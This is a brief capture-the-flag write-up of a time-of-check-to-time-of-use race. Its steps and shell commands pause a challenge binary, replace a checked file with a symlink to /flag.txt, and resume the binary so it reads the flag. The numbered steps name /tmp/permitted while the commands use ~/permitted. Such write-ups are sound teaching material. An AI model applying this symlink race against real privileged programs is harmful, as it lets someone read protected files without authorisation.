There is a delay between checking the file's permissions and opening it.

1. Create the `/tmp/permitted` file
2. Run the chal executable in the background
3. Create a symbolic link from `/tmp/permitted` to `/flag.txt`
4. don't write any text and press enter
5. the user will be able to read the flag

```sh
touch ~/permitted
cd /challenge
./chal
<ctrl+z> # to pause the process
ln -sf /flag.txt ~/permitted
fg 
# then press enter (don't write any text in the terminal)
```
